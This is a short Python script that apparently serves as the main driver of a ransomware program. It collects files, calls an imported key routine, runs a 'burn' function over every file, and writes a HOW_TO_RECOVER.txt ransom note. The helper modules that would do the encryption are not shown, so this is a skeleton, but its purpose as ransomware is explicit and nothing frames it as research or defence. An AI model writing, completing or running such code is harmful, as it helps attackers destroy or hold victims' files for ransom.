import discover
import burn
import seal

files=discover.find_files()
print(files)
seal.non_volatile_key()

for item in files:
    burn.main(item)

with open("HOW_TO_RECOVER.txt",'w') as file:
    file.write("RANSOM-RANSOM")
